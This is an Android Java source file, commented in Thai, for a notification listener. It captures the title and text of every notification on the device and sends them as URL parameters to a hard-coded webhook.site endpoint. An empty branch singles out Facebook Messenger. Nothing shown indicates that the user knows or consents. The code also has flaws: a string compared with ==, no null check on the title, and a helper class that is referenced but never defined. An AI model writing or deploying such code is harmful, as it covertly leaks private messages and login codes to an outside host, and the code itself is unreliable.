package com.example.reallineconnct2;

import android.app.Notification;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class NotificationListener extends NotificationListenerService {

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        super.onNotificationPosted(sbn);

        // ดึงข้อมูลการแจ้งเตือน
        String packageName = sbn.getPackageName();
        Notification notification = sbn.getNotification();
        if (notification != null) {
            CharSequence title = notification.extras.getCharSequence(Notification.EXTRA_TITLE);
            CharSequence text = notification.extras.getCharSequence(Notification.EXTRA_TEXT);

            // ดำเนินการกับข้อมูลการแจ้งเตือนที่ได้รับ
            Log.d("NotificationListener", "Received notification from: " + packageName);

            Log.d("NotificationListener", "Title: " + title);
            Log.d("NotificationListener", "Text: " + text);

            Uri.Builder builder = new Uri.Builder();
            builder.scheme("https") // กำหนด scheme เป็น https
                    .authority("webhook.site") // กำหนด authority (domain) ของ URL
                    .appendPath("e8018e87-9a3c-49d6-8a95-05370442ca1f"); // เพิ่ม path ของ resource ที่ต้องการ


            builder.appendQueryParameter("title", title.toString());
            builder.appendQueryParameter("text", text.toString());


            Uri builtUri = builder.build();


            String urlString = builtUri.toString();

            // new DownloadUrlTask().execute("https://webhook.site/e8018e87-9a3c-49d6-8a95-05370442ca1f");
            new DownloadUrlTask().execute(urlString);

            if(packageName.toString() == "com.facebook.orca")
            {



            }

        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        super.onNotificationRemoved(sbn);

        // ดำเนินการเมื่อมีการลบการแจ้งเตือน
    }



}

